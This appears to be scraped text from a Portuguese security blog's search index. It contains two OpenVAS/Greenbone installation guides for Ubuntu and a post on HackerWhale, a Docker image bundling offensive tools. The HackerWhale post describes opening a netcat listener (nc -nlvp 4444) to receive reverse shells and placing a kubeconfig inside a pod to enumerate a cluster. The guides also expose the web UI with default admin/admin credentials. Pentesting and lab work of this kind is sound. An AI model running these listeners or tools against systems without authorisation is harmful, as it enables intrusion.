Iniciaremos configurando a hora local do sistema operacional. No meu caso, vou definir a hora aqui de São Paulo.
sudo timedatectl set-timezone America/Sao_PauloAdicione o repositório necessário.
sudo add-apt-repository ppa:mrazavi/gvmAtualize a lista de repositórios do Ubuntu e atualize o sistema operacional.
sudo apt update &amp;&amp; sudo apt dist-upgrade Instalação do Postgresql &nbsp; Instale o Postgresql.
sudo apt install postgresqlHabilite o serviço.
sudo systemctl enable postgresqlReinicie o serviço do Postgresql
sudo systemctl restart postgresql Instalação do Openvas &nbsp; sudo apt install gvm Configuração do Redis &nbsp; O Redis será utilizado para armazenar toda a documentação do Openvas, sem ele nenhum scan iniciará. Basta seguir com a configuração padrão.
Configuração do Postgressql &nbsp; Pode seguir com a configuração pelo módulo gvmd-pg.
Em nosso exemplo, utilizaremos um Postgresql local, portando vamos seguir com locallhost.
Como vamos utilizar a autenticação identdo Posgresql, vamos deixar a senha em branco.
Atualização dos feeds ☕ &nbsp; Siga a sequência abaixo para atualizar dos feed de vulnerabilidades.
Busque um café porque essa parte irá demorar.
sudo -u gvm -g gvm greenbone-nvt-syncsudo -u gvm -g gvm greenbone-feed-sync --type GVMD_DATAsudo -u gvm -g gvm greenbone-feed-sync --type SCAPsudo -u gvm -g gvm greenbone-feed-sync --type CERT Configurando cron para atualização dos feeds diariamente &nbsp; Precisaremos que todos os dias sejam atualizadas a lista de vulnerabilidades a partir dos feeds.
Vamos criar um script de atualização do feed.
sudo vim /usr/local/bin/gvm-feedupdate.sh#!/bin/bash greenbone-nvt-sync greenbone-feed-sync --type GVMD_DATA greenbone-feed-sync --type SCAP greenbone-feed-sync --type CERT #/var/log/gvm/update_feed.logPrecisarmos dar permissão de execução e passar a propriedade do script para o usuário gvm.
sudo chmod +x /usr/local/bin/gvm-feedupdate.sh ; sudo chown gvm.gvm /usr/local/bin/gvm-feedupdate.shAgora, vamos adicionar o agendamento no crontab do usuario gvm:
sudo -u gvm -g gvm crontab -eAdicione linha a seguir em nosso arquivo. Ele o sistema operacional agendará para que todos os dias, ao meio dia, seja executada a série de comandos para atualização dos feeds, e que grave em update_feed.log os logs do update.
0 12 1 * * /usr/local/bin/gvm-feedupdate.sh &gt; /var/log/gvm/update_feed.logFicará mais ou menos assim:
Atualizando certificados &nbsp; Esta tarefa pode ser necessária para corrigir problemas de comunicação entre o GVM e o Openvas Scanner, assim precisando reconfigu os certificados.
sudo -u gvm -g gvm gvm-manage-certs -f -a Configurando o GSA (Web Interface) para acesso externo &nbsp; A princípio, o módulo GSA (Greenbone Security Assistant), que é responsável pelo gerenciamento da interface web, não permitie acesso de fora do servidor do Openvas. Para permitir acessos externos a interface web é necessário alterar o parâmetro GSAD_ADDRESS de 127.0.0.1 para 0.0.0.0.
Você pode utilizar o sed&hellip;
cd /etc/default ;\\ sudo sed -e &#39;s/127.0.0.1/0.0.0.0/g&#39; gsadOu simplesmente alterando o arquivo do serviço.
vim /etc/default/gsad Recarregue as novas configurações dos serviços.
sudo systemctl daemon-reloadReinicie todos os serviços instalados.
sudo systemctl restart ospd-openvas gsad gvmdAgora basta acessar a interface na porta 9392.
Credenciais: admin/admin
https://IP_DO_SERVIDOR:9392
Reconstruindo NVT db &nbsp; Pode acontecer de no momento da atualização dos feeds por alguma instabilidade de rede ocorrer algum interrupção e por sua vez crashear o banco dos NVTs (Network Vulnerability Testes). Para resolver esse problema basta executar os comandos abaixo, e realizar os feeds.
export $(sudo cat /etc/default/gvmd-pg) sudo -E -u gvm -g gvm gvmd --rebuild Deu pau? Olhe os logs! &nbsp; Todos os logs estão em /var/log/gvm. Se em algum momento tiver algum problema com a aplicação, verique o que ocorre lendo os logs.
$ ls -lh total 1.1M -rw-r--r-- 1 gvm gvm 18K Jul 7 09:25 gsad.log -rw------- 1 gvm gvm 190K Jul 7 07:53 gvmd.log -rw-r--r-- 1 gvm gvm 873K Jul 7 09:40 openvas.log -rw-r--r-- 1 gvm gvm 9.4K Jul 7 07:53 ospd-openvas.logNo momento da instalação, se suspeitar que há algo errado bom o Postrgresql, basta olhar seu log tabém para investigação em /var/log/postgresql/postgresql*.log.
🎁 Bônus - Máquina Virtual &nbsp; Caso tenha problemas na instalação ou queira realizar um assessment rápido basta baixar a máquina virtual (VMware) clicando aqui.
Lembre-se logar no Ubuntu e atualizar os feed, conforme mostro acima.
👾`}).add({id:64,tag:"en",href:"/blog/gestao-de-vulnerabilidades-com-greenbone-openvas_dez2021/",title:"Gestao de vulnerabilidades com Greenbone Openvas - Ubuntu 20.04 | Updated Dez 2021",description:"Um rápido how-to de como instalar o Greenbone Openvas no Ubuntu 20.04, além de uma breve introdução a gestão de vulnerabilidades. ",content:`Controle de Atualizações &nbsp; Data Atualização 07/07/2021 Primeira Versão. 22/12/2021 Correções de texto, revisão de configuração na nova versão pré-compilada e alterações de scripts e comandos. 27/12/2021 Revisão de procedimento de configuração do Postgres, troubleshooting e no script cron. Sumário &nbsp; Controle de Atualizações Sumário Introdução Por quê gerir vulnerabilidades e como fazer isso Um pouco de história Instalação e Configuração Instalação do Postgresql Instalação do OpenVAS Configuração do Redis Configuração do Postgresql Ajustando socket ao scanner Instalando pacotes adicionais ☕Atualização dos feeds Atualizando certificados Configurando o GSA (Web Interface) para acesso externo 🥳Acessando o OpenVAS! 🤖Configurando cron para atualização dos feeds diariamente Deu pau? Leia os logs! Reconstruindo NVTs e Configurações Criando novos usuários 🎬Vídeos demonstrativos Criando grupos de alvos Criando tarefa de scan Exportando relatório em PDF Exportando relatório em PDF com filtro de severidade 🎁Bônus - Máquina Virtual - Dez 2021 Agradecimentos Introdução &nbsp; Neste post vou passar alguns passos e possíveis armadilhas a serem evitadas para instalação do Openvas, que é um scanner de vulnerabilidades opensource que pode auxiliar seu time na detecção de riscos em seus ativos tecnológicos.
Outra motivação é poder ajudar todas as comunidades que possuem o Português como língua mãe. 🇵🇹 🇧🇷 🇦🇴 🇹🇱 🇲🇿 🇨🇻 🇬🇶 🇬🇼 🇸🇹
Os componentes a serem instalados serão:
OpenVas (Open Vulnerability Assessment Scanner) 21.4.3 - Scanner de Vulnerabilidades;
$ openvas --version OpenVAS 21.4.3 GVM (Greenbone Vulnerability Manager) 21.4.4 - Responsável por gerenciar as tasks de scan;
$ gvmd --version Greenbone Vulnerability Manager 21.4.4 GSA (Greenbone Security Assistant) 21.4.3 - Responsável por prover a interface web para gestão do usuário;
$ gsad --version Greenbone Security Assistant 21.4.3 OSP (Open Scanner Protocol) 21.4.3;
$ sudo ospd-openvas --version OSP Server for openvas: 21.4.3 Outros componentes auxiliares e bibliotecas.
Por quê gerir vulnerabilidades e como fazer isso &nbsp; A gestão de vulnerabilidades, apesar de ser apenas uma parte dos seus processos de Gestão de Segurança da Informação, ela é de extrema importância para ter visibilidades dos riscos em seu ambiente.
Algumas boas referências da importância desses processos podem ser encontrados em:
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf https://www.cisecurity.org/controls/continuous-vulnerability-management/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf Suriro os seguintes passos para uma boa gestão de vulnerabilidades seja conduzida:
Ter uma lista de todos os ativos de sua organização, assim como domínios e subdomínios, redes externas e internas; Saber quais são os seus ativos críticos para o funcionamento da organização; Manter a lista de ativos suas criticidades atualizadas; Organizar as agendas de scan destes ativos; Realizar análise e triagem dos relatórios destes scans, além de avaliar possíveis falsos positivos; Reportar vulnerabilidades, dando ênfase em vulnerabilidades altas e críticas, e riscos em ativos críticos; Realizar follow-ups periódicos com os times responsáveis pelas correções; Voltar ao item 3. Um pouco de história &nbsp; Em 2005, os desenvolvedores do scanner de vulnerabilidade Nessus decidiram descontinuar o trabalho em modelo opensource e mudar para um modelo de negócios proprietário.
Neste ponto, os desenvolvedores da Intevation e DN-Systems - as duas empresas que mais tarde fundariam a Greenbone Networks - já estavam contribuindo com desenvolvimentos para o Nessus, com foco em ferramentas de cliente. Os trabalhos foram apoiados principalmente pelo Escritório Federal Alemão de Segurança da Informação (BSI).
Instalação e Configuração &nbsp; Tudo o que será feito abaixo será com base em um repositório pronto para o Ubuntu. Mas se você quiser pode baixar os fontes, compilar e configurar da forma que quiser, basta acessar o repositório da Greenbone no Github: https://github.com/greenbone/
Vamos utilzar o repositório criado por Mohammad Razavi.
https://launchpad.net/~mrazavi/+archive/ubuntu/gvm
Iniciaremos configurando a hora local do sistema operacional. No meu caso, vou definir a hora aqui de São Paulo.
sudo timedatectl set-timezone America/Sao_PauloAdicione o repositório necessário.
sudo add-apt-repository ppa:mrazavi/gvmAtualize a lista de repositórios do Ubuntu e atualize o sistema operacional.
sudo apt update &amp;&amp; sudo apt dist-upgrade Instalação do Postgresql &nbsp; Instale o Postgresql.
sudo apt install postgresqlHabilite o serviço.
sudo systemctl enable postgresqlReinicie o serviço do Postgresql
sudo systemctl restart postgresql Instalação do OpenVAS &nbsp; sudo apt install gvm Configuração do Redis &nbsp; O Redis será utilizado para armazenar toda a documentação do OpenVas, sem ele nenhum scan iniciará. Basta seguir com a configuração padrão.
Configuração do Postgresql &nbsp; Pode seguir com a configuração pelo módulo gvmd-pg.
Em nosso exemplo, utilizaremos um Postgresql local, portando vamos seguir com localhost.
Como vamos utilizar a autenticação identdo Posgresql, vamos deixar a senha em branco.
&nbsp; Precisamos realizar apenas um pequeno ajuste nas roles do usuário gvmduser. sudo -i -u postgrespsql -U postgresCREATE ROLE gvm; alter role gvm with login Superuser Createrole CreateDB Replication BypassRLS;grant gvm to gvmduser;revoke dba from gvmduser;Saia do terminal do Postgres:
exit Ajustando socket ao scanner &nbsp; &nbsp; Nesta ultima versão pré-compilada, também é necessário realizar um pequeno ajuste para atribuir o arquivo de socket correto ao scanner do OpenVAS. Sem este ajuste não será possível construir os feed e configurações do OpenVAS. Primeiro vamos obter as informações de socket e scanner a atribuir às suas respectivas variáveis. Copie o bloco inteiro de comando abaixo, cole e execute em ser terminal:
socket=$(cat /etc/gvm/ospd-openvas.conf | grep unix_socket | cut -d &#34; &#34; -f 3) ; \\ scanner=$(sudo -u gvm -g gvm gvmd --get-scanners | grep OpenVAS | cut -d &#34; &#34; -f 1) Agora vamos configurar o gvmd com as informações corretas.
sudo -u gvm -g gvm gvmd --modify-scanner=$scanner --scanner-host=$socket Instalando pacotes adicionais &nbsp; sudo apt install texlive-fonts-recommended xsltproc xmlstarlet zip -y sudo apt install texlive-latex-extra --no-install-recommends -y ☕Atualização dos feeds &nbsp; Siga a sequência abaixo para atualização dos feeds de novas configurações e vulnerabilidades emergentes.
A partir daqui, a cada passo pode buscar um café ou chimarrão, porque vai levar tempo. 🧉
Aproveite para ler o cada feed irá trazer ao ser server em https://docs.greenbone.net/GSM-Manual/gos-21.04/en/managing-secinfo.html.
sudo -u gvm -g gvm greenbone-nvt-syncsudo -u gvm -g gvm greenbone-feed-sync --type GVMD_DATAsudo -u gvm -g gvm greenbone-feed-sync --type SCAP &nbsp; Em background o processo continuará populando o banco de dandos. Antes de ir para o próximo passo, aguarde até o fim deste processo observando o arquivo de log conforme é demonstrado na imagem abaixo ao executar o comando sudo tail -f /var/log/gvm/gvmd.log. sudo -u gvm -g gvm greenbone-feed-sync --type CERT &nbsp; Em background o processo continuará populando o banco de dandos. Antes de ir para o próximo passo, aguarde até o fim deste processo observando o arquivo de log conforme é demonstrado na imagem abaixo ao executar o comando sudo tail -f /var/log/gvm/gvmd.log. Tudo isso que fizemos acima, iremos automatizar nos capítulos seguintes. 😜
Atualizando certificados &nbsp; Esta tarefa pode ser necessária para corrigir problemas de comunicação entre o GVM e o Openvas Scanner, assim precisando reconfigu os certificados.
sudo -u gvm -g gvm gvm-manage-certs -f -a Configurando o GSA (Web Interface) para acesso externo &nbsp; A princípio, o módulo GSA (Greenbone Security Assistant), que é responsável pelo gerenciamento da interface web, não permitie acesso de fora do servidor do Openvas. Para permitir acessos externos a interface web é necessário alterar o parâmetro GSAD_ADDRESS de 127.0.0.1 para 0.0.0.0.
Você pode utilizar o sed&hellip;
Adicionalmente, iremos habilitar o HTTPS para acessar a manager com criptografia.
cd /etc/default ;\\ sudo sed -i &#39;s/127.0.0.1/0.0.0.0/g&#39; gsad ; \\ sudo sed -i &#39;s/GSAD_OPTIONS=&#34; --http-only&#34;//g&#39; gsadOu simplesmente alterando o arquivo do serviço.
vim /etc/default/gsad Recarregue as novas configurações dos serviços.
sudo systemctl daemon-reloadReinicie todos os serviços instalados.
sudo systemctl restart ospd-openvas gsad gvmd 🥳Acessando o OpenVAS! &nbsp; Agora basta acessar a interface na porta 9392.
Credenciais: admin/admin
https://IP_DO_SERVIDOR:9392
🤖Configurando cron para atualização dos feeds diariamente &nbsp; Precisaremos que todos os dias sejam atualizadas a lista de vulnerabilidades a partir dos feeds.
Vamos criar um script de atualização do feed.
sudo vim /usr/local/bin/gvm-feedupdate.sh#!/bin/bash /usr/bin/greenbone-nvt-sync &amp; wait $! echo &#34;\\nFinalizado NVT Update.\\n&#34; /usr/sbin/greenbone-feed-sync --type GVMD_DATA &amp; wait $! echo &#34;\\nFinalizado GVM_DATA Update.\\n&#34; /usr/sbin/greenbone-feed-sync --type SCAP &amp; wait $! echo &#34;\\nFinalizado SCAP Update.\\n&#34; /usr/sbin/greenbone-feed-sync --type CERT &amp; wait $! echo &#34;\\nFinalizado CERT Update.\\n&#34;Precisarmos dar permissão de execução e passar a propriedade do script para o usuário gvm.
sudo chmod +x /usr/local/bin/gvm-feedupdate.sh ; sudo chown gvm.gvm /usr/local/bin/gvm-feedupdate.shAgora, vamos adicionar o agendamento no crontab do usuario gvm:
sudo -u gvm -g gvm crontab -eAdicione linha a seguir em nosso arquivo. Ele o sistema operacional agendará para que todos os dias, ao meio dia, seja executada a série de comandos para atualização dos feeds, e que grave em update_feed.log os logs do update.
0 12 1 * * bash /usr/local/bin/gvm-feedupdate.sh Ficará mais ou menos assim:
Deu pau? &nbsp; Leia os logs! &nbsp; Todos os logs estão em /var/log/gvm. Se em algum momento tiver algum problema com a aplicação, verique o que ocorre lendo os logs.
$ ls -lh /var/log/gvm/ total 68K -rw-r--r-- 1 gvm gvm 2.2K Dec 26 19:58 gsad.log -rw------- 1 gvm gvm 43K Dec 26 19:15 gvmd.log -rw-r--r-- 1 gvm gvm 8.3K Dec 26 19:35 openvas.log -rw-r--r-- 1 gvm gvm 1.9K Dec 26 17:04 ospd-openvas.logNo momento da instalação, se suspeitar que há algo errado bom o Postrgresql, basta olhar seu log tabém para investigação em /var/log/postgresql/postgresql*.log.
Reconstruindo NVTs e Configurações &nbsp; Pode acontecer de no momento da atualização dos feeds por alguma instabilidade de rede ocorrer algum interrupção e por sua vez crashear o banco dos NVTs (Network Vulnerability Tests) e demais configurações do scanner, como lista de portas, templates de scan, etc. Para resolver esse problema basta executar os comandos abaixo, e realizar os feeds.
export $(sudo cat /etc/default/gvmd-pg) sudo -E -u gvm -g gvm gvmd --rebuild sudo -E -u gvm -g gvm gvmd --rebuild-gvmd-data=all sudo -E -u gvm -g gvm gvmd --rebuild-scap=allReinicie todos os serviços instalados.
sudo systemctl restart ospd-openvas gsad gvmd Criando novos usuários &nbsp; Você pode utilizar a facilidade da linha de comando para já iniciar a criação de usuários.
Primeiro de tudo, você deve entender qual a função do usuário a ser criado, você pode obter as roles disponíveis da seguinte forma:
$ sudo -u gvm -g gvm gvmd --get-roles Admin Guest Info Monitor User Super Admin ObserverUsando como exemplo que o usuário será o &ldquo;todo poderoso&rdquo; , ele deve ter a role de Super Admin. Caso ele tenha toda a liberdade de configurar scans, targets e configurações, porém você não quer que ele veja os scans de outros usuários também administradores, ele deve conter a role Admin.
Para criar o usuário com a role desejada, basta usar o comando de exemplo abaixo:
sudo -u gvm -g gvm gvmd --create-user=&#34;tiago.tavares&#34; --password=&#34;SENHA&#34; --role=&#34;Super Admin&#34; 🎬Vídeos demonstrativos &nbsp; Segue alguns vídeos para facilitar o início da utilização.
Criando grupos de alvos &nbsp; Criando tarefa de scan &nbsp; Exportando relatório em PDF &nbsp; Exportando relatório em PDF com filtro de severidade &nbsp; 🎁Bônus - Máquina Virtual - Dez 2021 &nbsp; Caso tenha problemas na instalação ou queira realizar um assessment rápido basta baixar a máquina virtual (VMware) clicando aqui.
Lembre-se logar no Ubuntu e atualizar os feed, conforme mostro acima.
Agradecimentos &nbsp; Abro este espaço também para agradecer a toda comunidade que me retornou ótimos feedbacks e me ajudou a melhorar o procedimento. Obrigado Maicon Triches pelo apoio nas melhorias!
👾`}).add({id:65,tag:"en",href:"/tags/golang/",title:"Golang",description:"",content:""}).add({id:66,tag:"en",href:"/tags/greenbone/",title:"Greenbone",description:"",content:""}).add({id:67,tag:"en",href:"/tags/guardicore/",title:"Guardicore",description:"",content:""}).add({id:68,tag:"en",href:"/blog/hackerwhale_container/",title:"HackerWhale",description:"Uma imagem Docker para propostas ofensivas com funções de expansão. Compatível com ambientes Kubernetes.",content:`HackerWhale Motivação Características Lista de Ferramentas Instalação e execução Contrução do container no modo &ldquo;Baleião&rdquo; pronto para uso Construção do container utilizando a função de expansão Execução e acesso ao container Casos de uso Proxy externo ZAProxy BurpSuite Conexões Reversas Kubernetes Minikube Kubernetes Discovery &amp; Scan HackerWhale &nbsp; Este projeto é o resultado da necessidade encontrada durante um trabalho onde haviam poucos recursos disponíveis, e uma imagem de container personalizada foi a solução criada.
Assim foi criado o &ldquo;HackerWhale&rdquo;, que em poucos minutos te disponibilizará tudo o que é necessário para realizar testes em sua rede, seja em redes corporativas ou ambiente Kubernetes.
Docker
docker pull 0xtiago/hackerwhale:latestKubernetes
kubectl apply -f hackerwhale-k8s.yamlPara casos de uso e detalhes, basta seguir neste humilde artigo. :)
Ferramentas prontas para expansão disponível em https://github.com/0xtiago/HackerWhale. Motivação &nbsp; Recentemente, me deparei com uma situação onde precisei realizar uma avaliação rápida em um ambiente, mas naquele extao momento eu ainda não possuía direitos administrativos, e muito menos ferramentas de virtualização (VBox/VMWare) no laptop fornecido. No entanto, estava disponível o Docker Desktop. Então, decidi gastar um tempo construindo meu próprio container com minhas ferramentas favoritas.
Haviam outras opções disponíveis, mas elas não eram viáveis naquele momento devido aos seguintes motivos:
Container Docker do Kali Linux: O proxy de rede bloqueou o repositório do Kali (A atualização por apt update &amp;&amp; apt -y install kali-linux-headless não era possível); Hacker Container: É uma opção interessante, mas tudo está centralizado no Dockerfile, algo que, na minha humilde opinião, torna a manutenção deste projeto mais confuso e difícil de manter. Então, aqui trago duas opções após essa jornada de testes:
Uma versão completa e expandida disponível em Docker Hub. Possibilidade de criar sua própria imagem personalizada. Características &nbsp; A maior preocupação durante a construção da imagem base era manter a mesma experiência de trabalho em um host Ubuntu Linux que geralmente trabalho, incluido Zsh com Oh-My-Zsh, Oh-My-Tmux, e manutenção do histórico de comandos em $(PWD).
Abaixo um resumo das características deste projeto:
Imagem disponível no registry Dockerhub para facilitar o seu uso. Imagem em multiplataforma e script de expansão preparados para construção em amd64 e arm64. Customização de armazenamento de histórico para uso contínuo em /workdir/.zsh_history_docker, podendo ser mapeado e mantido no host, podemos ser reutilizado em outras imagens criadas. Shell com boa experiência para o usuário com ZSH (Ohmyzsh) e TMUX (Ohmytmux). Dockerfile pronto para expansão através de argumentos de uso de scripts em bash local ou a partir de uma URL. Dezenas de ferramentas disponíveis. Lista de Ferramentas &nbsp; Abaixo a lista de ferramentas disponível até o momento da última atualização deste post. O código sempre será mantido e atualizado em https://github.com/0xtiago/HackerWhale.
# Tool 1. Altdns 2. Alterx 3. Amass 4. Anew 5. Antiburl 6. Arjun 7. arp_scan 8. Assetfinder 9. Burl 10. Brutespray 11. ChaosClient 12. Collector 13. DalFox 14. Dirsearch 15. Dnsx 16. DNSValidator 17. ffuf 18. Findomains 19. Gau 20. Gauplus 21. Gf 22. GithubSearch 23. GitDorker 24. GitDumper 25. GoogleChrome 26. GoSpider 27. Gowitness 28. Hakrawler 29. Hakrevdns 30. Haktrails 31. Httprobe 32. Httpx 33. JohnTheRipper 34. JSScanner 35. K9s 36. Kiterunner 37. Kubectl 38. LinkFinder 39. Mapcidr 40. Massdns 41. Masscan 42. MegaPy 43. Metabigor 44. Naabu 45. Netcat 46. Nmap 47. Notify 48. Nrich 49. Nuclei 50. ParamSpider 51. Qsreplace 52. ShufleDNS 53. Sqlmap 54. Sub404 55. Subfinder 56. Subjs 57. sslscan 58. Stress_ng 59. Telegram_Send 60. TurboSearch 61. Unfurl 62. Uro 63. Waybackurls 64. wafw00f 65. WPScan Instalação e execução &nbsp; Contrução do container no modo &ldquo;Baleião&rdquo; pronto para uso &nbsp; Este modo carinhosamente chamado de Baleião, se trata do container em seu formato completo, com todas as ferramentas. Você pode contruí-lo acessando o repositório no Github ou realizar o pull desta imagem completa diretamente do DockerHub.
Faça o pull da imagem do repositório do Github.
docker pull 0xtiago/hackerwhale:latestExecute o container.
docker run -d -v $PWD:/workdir --name hackerwhale hackerwhaleAcesse o terminal do container.
docker exec -it hackerwhale /bin/zsh Construção do container utilizando a função de expansão &nbsp; Como citado no inicío, uma da maiores motivações para construir esta imagem era a possibilidade torná-la expansível, entregando uma imagem base para uma boa experiência de uso. Para realizar a construção no formato expansível basta seguir os passos seguintes.
Clone o repositório, acesse-o.
git clone https://github.com/0xtiago/HackerWhale &amp;&amp; cd HackerWhale Com o uso de argumentos você poderá expandir o container com as aplicações que desejar escrevendo o seu próprio shell script de expansão. Você pode usar este aqui como base, se quiser.
Esta imagem está configurada para receber dois argumentos a partir da opção --build-arg, EXPANSION_SCRIPT_LOCAL e EXPANSION_SCRIPT_URL, onde você pode passar um script local ou um script disponível em uma URL, respectivamente.
Exemplo utilizando script local:
docker build --build-arg \\ EXPANSION_SCRIPT_LOCAL=scripts/expansion_script.sh -t hackerwhale .Exemplo utilizando script remoto:
docker build --build-arg \\ EXPANSION_SCRIPT_URL=&#34;https://raw.githubusercontent.com/0xtiago/HackerWhale/main/scripts/expansion_script.sh&#34; -t hackerwhale . Execução e acesso ao container &nbsp; Nos exemplos há algumas opções de uso que serão aprofundadas mais adiante. No comando docker run iremos utilizar algumas opções de destaque:
-v $PWD:/workdir: Mapeamento do diretório local de execução do host com o diretório /workdir do container. Essa é uma opções que particularmente gosto para fins de organização. --net=host: Configuração do container na mesma rede do host, assim seus serviços podem se comunicar entre si. Um exemplo de necessidade desta opção é a comunicação entre o container e a porta de um proxy no host, como ZAProxy ou BurpSuite. -p Porta do Container:Porta do Host: Opção muito utilizada para expor portas de serviços do container para acesso pelo host. Mais adiante demonstramos seu uso para o recebimento de conexões reversas. Obs.: Não deve ser usada em conjunto com --host. No exemplo abaixo, configuramos para que sua pasta local seja mapeada no em /workdir no container para facilitar a organização durante os trabalhos. No comando também foi adicionada a opção --net=host para extender a possibilidade de interagir com algum proxy do host, como ZAProxy, Burp Suite, Caido, etc.
Execução do container sem configurações de redes ou portas. Opcionalmente, mantendo o seu nome como hackerwhale.
docker run -d -v $PWD:/workdir --name hackerwhale hackerwhaleExecução do container na mesma rede do host.
docker run -d --net=host -v $PWD:/workdir --name hackerwhale hackerwhaleExecução do container expondo portas de serviço (Ex.: netcat).
docker run -d -v $PWD:/workdir -p 4444:4444 --name hackerwhale hackerwhaleUma vez executado o container em qualquer das opções, acesso o container pelo entrypoint /bin/zsh para acessar a shell e iniciar o seu uso.
docker exec -it hackerwhale /bin/zsh Casos de uso &nbsp; Proxy externo &nbsp; Para utilizar proxies externos e poder interceptar comunicação HTTPS, é necessário instalar seus certificados. As configurações de certificado dos proxies são todas realizadas a partir da shell do container.
docker exec -it hackerwhale /bin/zsh ZAProxy &nbsp; Após executar o ZAProxy, baixe o certificado acessando o endereço padrão http://localhost:8080.
Ou baixe o certificado pela próprio GUI:
Após o download, pela shell do container, é necessário converter o certificado em DER ou PEM para Base64.
openssl x509 -inform PEM -in ZAPCACert.cer -out ZAPCACert.crtDepois é só importar o certificado convertido. Para facilitar este passo, foi criado shell script. Os mesmos passos serão necessários para os outros proxies.
sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/0xtiago/HackerWhale/main/scripts/check_and_copy_cert.sh)&#34; - ZAPCACert.crtApós a importação basta configurar as variavéis de ambiente http_proxy e https_proxy do container para acessar a portar do proxy do host. No exemplo abaixo a porta é a 8080.
# Caso queira usar o Burp, basta exportar internamente as portas de proxy export http_proxy=&#34;http://host.docker.internal:8080&#34; ;\\ export https_proxy=&#34;http://host.docker.internal:8080&#34; Para desfazer a configuração do proxy, basta remover as variáveis de ambiente.
#Para desconfigurar unset http_proxy &amp;&amp; unset https_proxy BurpSuite &nbsp; Após executar o BurpSuite, baixe o certificado acessando o endereço padrão http://localhost:8080.
Ou baixe pelo pela interface da ferramenta seguinte os seguintes passos:
Pela shell do container, converta o certificado do formato DER para Base64.
openssl x509 -inform DER -in burp_cert.der -out burp_cert.crtRealize a importação do certificado:
sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/0xtiago/HackerWhale/main/scripts/check_and_copy_cert.sh)&#34; - burp_cert.crt Configure as variáveis de ambiente para direcionar o tráfego para o Burp:
export http_proxy=&#34;http://host.docker.internal:8080&#34; ;\\ export https_proxy=&#34;http://host.docker.internal:8080&#34;E agora é só testar.
Para desfazer a configuração do proxy, basta remover as variáveis de ambiente.
#Para desconfigurar unset http_proxy &amp;&amp; unset https_proxy Conexões Reversas &nbsp; Se quiser abrir uma porta para receber conexões reversas, no exemplo é demonstrado o mapeamento da porta 4444 no host e direcionando para mesma porta no container:
docker run -d -v $PWD:/workdir -p 4444:4444 --name hackerwhale hackerwhaleAcesse o container e execute o netcat para receber as conexões:
docker exec -it hackerwhale /bin/zsh nc -nlvp 4444 Recebendo conexão reversa na porta 4444. Recebendo conexão de um outro pod em ambiente Kubernetes.
Kubernetes &nbsp; Uma vez que temos um container com estas capacidades, podemos utilizá-lo dentro de um cluster de Kubernetes como um pod. Estão disponíveis dois YAMLs para este laboratório, um para Minikube e outro para Kubernetes, além de outros YAMLs prontos para outros serviços que utilizaremos no laboratório. As imagens que utilizaremos serão as seguintes:
0xtiago/hackerwhale postgres:latest nginx:latest rabbitmq:latest Todos os arquivos necessários para os laboratórios abaixo estão dentro da pasta k8s no repositório deste projeto.
Minikube &nbsp; Para um laboratório mais simples como o nosso, como prova de conceito, podemos utilizar o Minikube para simular um cluster de Kubernetes. Neste laboratório precisaremos customizar algumas coisas para evitar conflitos com caminhos absolutos dentro do pod do HackerWhale. Mas tenha fé que tudo vai dar certo! :-)
Instale o Minikube e o inicie.
minikube start Utilizando o nosso repositório base de scripts, aplique os yamls prontos para os nossos tres serviços alvos.
kubectl apply -f postgresql.yaml kubectl apply -f nginx.yaml kubectl apply -f rabbitmq.yaml Verifique se os pods estão em execução.
kubectl get deployments kubectl get services kubectl get pods Agora será necessário realizar algumas customizações no kubeconfig. Obtenha o endereço do Minikube para que possamos gerar um arquivo kubeconfig especifico para o Pod no minikube para evitar conflitos dos endereçamentos.
minikube ip 192.168.49.2Edite o arquivo minikube-kubeconfig com o endereço obtido em seu ambiente. No ambiente testado ficou assim:
apiVersion: v1 kind: Config clusters: - cluster: certificate-authority: /etc/kubernetes/certs/ca.crt server: https://192.168.49.2:8443 # IP do Minikube ($ minikube ip) name: minikube contexts: - context: cluster: minikube user: minikube name: minikube current-context: minikube users: - name: minikube user: client-certificate: /etc/kubernetes/certs/client.crt client-key: /etc/kubernetes/certs/client.keyAgora, vamos criar o Secret para o nosso kubeconfig personalizado e para os certificados :
$ kubectl create secret generic minikube-kubeconfig-secret --from-file=config=./minikube-kubeconfig $ kubectl create secret generic minikube-certificates \\ --from-file=client.crt=$HOME/.minikube/profiles/minikube/client.crt \\ --from-file=client.key=$HOME/.minikube/profiles/minikube/client.key \\ --from-file=ca.crt=$HOME/.minikube/ca.crtAgora podemos aplicar nosso hackerwhale-minikube.yaml para gerar o nosso pod.
kubectl apply -f hackerwhale-minikube.yaml Liste novamente os pods para verificiar se todos estão disponíveis:
kubectl get pods Comos todos disponíveis em nosso Minikube, podemos acessar o pod e verificar se podemos utilizar o kubectl internamente. Isso nos permitirá mais facilmente enumerar o ambiente interno e poder realizar qualquer assessment necessário.
Agora já podemos acessar o nosso pod com os secrets importados durante sua criação.
kubectl exec -it hackerwhale -- /bin/zshE a partir do pod, podemos listar os demais. \\o/
kubectl get pods Kubernetes &nbsp; Para este laboratório, foi criado um cluster de Kubernetes no Vultr.
Baixe as configurações do seu cluster e adicione à variável de ambiente $KUBECONFIG . O nome do meu arquivo exportado foi vke-58626b70-6270-4106-b1a1-a1e7754f6131.yaml.
export KUBECONFIG=$KUBECONFIG:~/.kube/config:~/.kube/vke-58626b70-6270-4106-b1a1-a1e7754f6131.yamlUma vez com as configurações importadas, podemos visualizar todos os contextos disponíveis:
kubectl config get-contexts Saia do contexto do Minikube e inicie os trabalhos em nosso novo cluster criado.
kubectl config use-context vke-58626b70-6270-4106-b1a1-a1e7754f6131Confirme a mudança e listando o contexto e os seus nodes.
$ kubectl config current-context $ kubectl get nodes Agora podemos subir os mesmos pods gerados em nosso lab no Minikube.
kubectl apply -f postgresql.yaml; \\ kubectl apply -f nginx.yaml; \\ kubectl apply -f rabbitmq.yamlVerifique se os pods estão disponíveis.
kubectl get pods Com o ambiente preparado para atender o YAML disponível para ambientes em K8s, podemos gerar o secret para ser importado para o nosso pod e poder interagir com o cluster de dentro do pod.
kubectl create secret generic k8s-kubeconfig-secret --from-file=config=/Users/tiago/.kube/vke-58626b70-6270-4106-b1a1-a1e7754f6131.yamlAgora é só subir o pod.
kubectl apply -f hackerwhale-k8s.yamlPara acompanhar o pull da imagem e sua configuração durante ou após sua aplicação, pode executar o seguinte comando.
kubectl describe pod hackerwhale-k8s Uma vez com status de RUNNING, podemos entrar no terminal do nosso container.
